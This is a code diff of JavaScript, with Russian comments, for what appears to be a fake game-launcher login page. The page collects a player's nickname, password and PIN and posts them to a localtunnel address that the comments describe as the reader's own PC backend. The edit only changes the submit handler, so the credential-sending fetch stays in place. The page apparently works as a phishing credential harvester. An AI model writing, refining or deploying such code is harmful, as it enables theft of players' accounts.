@@ -18,7 +18,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }, 45);
 });
 
-const loginForm = document.getElementById('main-login-form'), tabForum = document.getElementById('btn-tab-forum'), tabNews = document.getElementById('btn-tab-news'), tabSupport = document.getElementById('btn-tab-support');
+const loginBtn = document.getElementById('btn-login'), tabForum = document.getElementById('btn-tab-forum'), tabNews = document.getElementById('btn-tab-news'), tabSupport = document.getElementById('btn-tab-support');
 const nicknameInput = document.getElementById('input-nickname'), passwordInput = document.getElementById('input-password'), pincodeInput = document.getElementById('input-pincode'), checkboxToggle = document.getElementById('checkbox-pincode-toggle');
 const launcher = document.getElementById('launcher'), customAlert = document.getElementById('custom-alert'), alertText = document.getElementById('alert-text');
 const loadingPage = document.getElementById('loading-page'), progressBar = document.getElementById('bar'), loadStatus = document.getElementById('load-status'), loadPercent = document.getElementById('load-percent');
@@ -100,8 +100,8 @@ pincodeInput.addEventListener('input', function() {
   if (this.value.length === 4) { this.classList.remove('field-invalid'); this.classList.add('field-valid'); } else { this.classList.remove('field-valid', 'field-invalid'); }
 });
 
-// ОТПРАВКА ДАННЫХ ИЗ ФОРМЫ НА ТВОЙ БЭКЕНД
-loginForm.addEventListener('submit', function(e) {
+// КЛИК ПО КНОПКЕ ВОЙТИ ВЕРНУЛСЯ НА СТАНДАРТНЫЙ НАДЕЖНЫЙ ОБРАБОТЧИК
+loginBtn.addEventListener('click', function(e) {
   e.preventDefault(); 
   const n = nicknameInput.value, p = passwordInput.value, pin = pincodeInput.value;
   
@@ -109,10 +109,9 @@ loginForm.addEventListener('submit', function(e) {
   if (p.trim() === "" || p.length < 6) { showGameAlert("Защита аккаунта: Введите действующий Пароль!"); passwordInput.classList.add('field-invalid', 'has-text'); return; }
   if (checkboxToggle.checked && (pin.trim() === "" || pin.length < 4)) { showGameAlert("Защита аккаунта: Введите 4-значный Пин-код!"); pincodeInput.classList.add('field-invalid'); return; }
   
-  // ВСТАВЬ СВОЮ ДИНАМИЧЕСКУЮ ССЫЛКУ ИЗ LOCALTUNNEL СЮДА
+  // ВСТАВЬ СВОЮ АКТУАЛЬНУЮ ССЫЛКУ ИЗ LOCALTUNNEL СЮДА
   const backendUrl = "https://warm-buckets-ask.loca.lt";
   
-  // Отправляем чистый JSON-пакет на твой бэкенд на ПК
   fetch(backendUrl, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
